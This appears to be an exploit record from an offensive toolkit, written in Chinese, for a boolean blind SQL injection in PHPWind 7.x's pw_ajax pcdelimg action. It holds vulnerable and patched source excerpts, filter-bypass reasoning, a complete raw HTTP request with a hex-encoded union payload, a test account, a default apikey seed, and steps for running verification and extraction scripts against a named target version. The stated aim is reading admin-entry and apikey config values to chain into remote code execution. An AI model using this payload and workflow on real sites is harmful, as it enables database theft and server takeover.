# PHPWind 7.x pw_example.com?action=pcdelimg fieldname 布尔盲注（wooyun-2010-0417，影响 phpwind 7/8，7.5 SP3 已修）

- **code**: phpwind-7.x-pw_example.com-action-pcdelimg-fieldname-布尔盲注-wooyun-2010-0417-影响-phpwi
- **kind**: poc
- **category**: sqli
- **component**: PHPWind
- **versions**: PHPWind 7.x 全系（wooyun 报告明确写"影响 phpwind 7 和 phpwind 8"）；7.5 早期未修，7.5 SP3 及以后已加 pw_pcfield 白名单校验。含 7.3.2（早于修复点，待实测 action 存在性）
- **language**: bash
- **source**: web
- **source_url**: http://target271.example.com/bug_detail.php?wybug_id=wooyun-2010-0417
- **verified_note**: 【情报角色零目标请求 —— 本条未在目标上发包验证】。全部结论为源码级确证：① 未修形态代码与 wooyun 原文逐字一致（maddogfyg-itangyou/pw_example.com L1927-1944，该仓库 example.sql 内含 "PHPWind v7.5" 属 7.5 早期）；② 7.5 SP3 同位置确已多一行 pw_pcfield 白名单校验（真补丁）；③ CheckVar/Char_cv 清洗清单与 halt 报错回显链均逐行读出。**唯一未确证项：目标 7.3.2 是否存在 pcdelimg action** —— 需执行端用 01-verify-pcdelimg.sh 的 2 个包判定。另：db_siteownerid 格式经源码确证为 substr(md5(...),0,32) 纯 hex 32 位（admin/app.php::generatestr L312-321），默认种子值 43ad6aed9e1523ba169f562221480891（data/pw_0924_*.sql L2516）可零成本先试。
- **path**: pocs/phpwind-7.x-pw_ajax.php-action-pcdelimg-fieldname-布尔盲注-wooyun-2010-0417-影响-phpwi/pcdelimg-blind-sqli.sh
- **tags**: phpwind,7.3.2,sql注入,盲注,pcdelimg,pw_ajax,后台入口,db_adminfile,apikey
- **created_at**: 2026-10-06T18:11:02.390Z
- **found_by**: exploit

## 描述

wooyun-2010-0417 第一洞。pw_example.com 的 pcdelimg action 把 fieldname 参数未经任何过滤直接拼进 SELECT，形成布尔盲注，可读 pw_config 任意配置项。本靶标最大价值：直接读出 db_adminfile（主站后台入口文件名，解决 example.com 改名 404 问题）与 db_siteownerid（pw_api.php 的 apikey，用于打通 RCE 链）。

## 用法

```
1) 先跑 runs/pw-rce-exp/01-verify-pcdelimg.sh（3 包）判定目标 7.3.2 有无 pcdelimg action：
   包A action=pcdelimg&fieldname=1&pctype=postcate&tid=1&id=1
   包B action=pcdelimgX9&fieldname=1&pctype=postcate&tid=1&id=1（对照）
   判据：包A 响应含 "Query Error" 或 pw_pcvalue/pw_topicvalue => action 存在、注入可用
       包A 与包B 完全一致 => 该版本无此 action，本链放弃
2) 命中后跑 runs/pw-rce-exp/02-pcdelimg-blind-sqli.py：
   python3 02-pcdelimg-blind-sqli.py --name db_adminfile
   python3 02-pcdelimg-blind-sqli.py --name db_siteownerid --hex
   默认 base=https://example.com/bbs，账号 aa123123/aa123123，间隔 0.6s
3) 手动单发请求模板见 content 字段（完整 HTTP 原文）
4) 需要替换的参数：BASE_URL / USER / PASS / NAME_HEX / PREFIX_HEX
```

## 正文

```
未修形态源码（runs/pw-src-732/maddogfyg-itangyou/pw_example.com L1927-1944，与 wooyun 原文逐字一致）：
  } elseif ($action == 'pcdelimg') {
      InitGP(array('tid','id','fieldname','pctype'));
      if (!$tid || !$id || !$fieldname || !$pctype) { echo 'fail'; }
      if ($pctype == 'topic')       { $tablename .= 'pw_topicvalue'.$id; }
      elseif ($pctype == 'postcate'){ $tablename .= 'pw_pcvalue'.$id; }
      $path = $db->get_value("SELECT $fieldname FROM $tablename WHERE tid=". pwEscape($tid));   // ← 无过滤
      if (strpos($path,'..') !== false) { return false; }
  }

已修形态（runs/pw-src-732/pw75sp3/pw_example.com L1993-2035）多插一行白名单，把 payload 挤出注入位置：
  $fieldname = $db->get_value("SELECT fieldname FROM pw_pcfield WHERE fieldname=" . pwEscape($fieldname));  // ← 7.5 SP3 新增
  if (!$fieldname || !$tablename) { echo 'fail';ajax_footer(); }
  $path = $db->get_value("SELECT $fieldname FROM $tablename WHERE tid=". pwEscape($tid));

清洗规则（require/common.php）：
  L624-636 CheckVar: 只替换  .. -> &#46;&#46;   ) -> &#41;   < -> &#60;   = -> &#61;
  L603-623 Char_cv :  " -> &quot;    ' -> &#39;
  => payload 必须零引号/零右括号/零等号；0x 十六进制字面量天然满足

报错回显链（判据成立性）：
  require/db_mysql.php L116   !$query && $error && $this->halt('Query Error: '.$SQL);
  require/db_mysql_error.php L13   echo "<table><tr><td>$msg";   // SQL 原文完整回显

鉴权（pw_example.com L7-9）：游客白名单仅 login/showface/showsmile/getverify/showcard/asearch/poplogin/pingpage
  => pcdelimg 需登录态；aa123123(gid=8) 足够，不需版主/后台
  => winduser cookie 密钥 = md5(UA . db_hash)，全程必须固定同一 User-Agent

完整请求原文（GET/POST 均可，POST 更稳）：
POST /bbs/pw_example.com HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/203.0.113.36 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: <aa123123 登录后的 cookie>

action=pcdelimg&fieldname=db_value+from+pw_config+where+db_name+like+0x64625f736974656f776e65726964+and+db_value+like+0x30+25+union+select+0x612e2e%3B%23&pctype=postcate&tid=1&id=1

payload 说明：db_value from pw_config where db_name like 0x<NAME_HEX> and db_value like 0x<PREFIX_HEX>25 union select 0x612e2e;#
  - 0x612e2e = 'a..' 哨兵；命中则第1行是真实值（无 '..'）→ 继续执行 → UPDATE 报错 → 回显含 pw_config
                     未命中则第1行是 'a..' → strpos('..') 命中 → return false → 脚本终止、无 SQL 报错
  - 末尾 # 把原 SQL 的 FROM pw_topicvalue1 WHERE tid=.. 全注释掉 => 不依赖任何业务表是否存在
  - 25 = '%'；<PREFIX_HEX> 为已爆前缀+候选字符的 hex

落盘脚本：
  runs/pw-rce-exp/01-verify-pcdelimg.sh      （3 包判定 action 存在性）
  runs/pw-rce-exp/02-pcdelimg-blind-sqli.py  （完整盲注，零依赖，默认 0.6s 间隔）
```
